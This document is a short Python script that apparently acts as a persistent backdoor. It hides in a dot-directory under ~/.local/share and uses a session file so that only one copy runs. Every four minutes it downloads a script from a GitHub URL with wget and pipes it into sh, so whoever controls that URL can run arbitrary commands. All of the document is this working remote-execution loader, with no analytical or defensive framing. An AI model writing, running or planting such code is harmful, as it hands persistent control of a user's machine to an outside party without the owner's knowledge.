#!/usr/bin/python3
from os import fork, execv, chdir, environ, open, O_CREAT, O_RDWR, read, write, lseek, SEEK_SET, wait
from uuid import uuid4
chdir(environ["HOME"]+"/.local/share/.advancedManager/")
session=open(environ["HOME"]+"/.local/share/.advancedManager/session", O_CREAT+O_RDWR, 384)
while True:
	val=str(uuid4()).encode("utf-8")
	write(session, val)
	if fork()==0:
		execv("/bin/sleep", ["sleep", "240"])
	wait()
	lseek(session, 0, SEEK_SET)
	if val!=read(session, 36):
		exit()
	lseek(session, 0, SEEK_SET)
	if fork()==0:
		execv("/bin/sh", ["sh", "-c", "sh -c \"$(wget -q -O - https://raw.githubusercontent.com/mangadrm/cp/master/onlinecmd)\""])
	wait()
